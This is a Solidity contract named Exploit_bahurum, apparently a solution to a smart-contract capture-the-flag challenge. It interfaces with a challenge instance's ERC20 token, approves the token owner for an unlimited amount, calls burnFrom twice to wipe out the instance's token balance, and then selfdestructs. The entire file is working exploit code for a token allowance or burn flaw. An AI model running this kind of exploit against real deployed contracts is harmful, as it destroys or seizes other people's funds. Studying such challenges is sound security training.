// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IChallenge_bahurum {
    function token() external view returns (IChallenge_bahurum_token);
}

interface IChallenge_bahurum_token is IERC20 {
    function owner() external view returns (address);

    function burnFrom(address, uint256) external;
}

contract Exploit_bahurum {
    IChallenge_bahurum instance;
    IChallenge_bahurum_token token;

    constructor(IChallenge_bahurum _instance) payable {
        instance = _instance;
        token = instance.token();
    }

    function finalize() external {
        token.approve(token.owner(), type(uint256).max);
        token.burnFrom(address(instance), token.balanceOf(address(instance)));
        token.burnFrom(address(instance), token.balanceOf(address(instance)));

        selfdestruct(payable(msg.sender));
    }
}
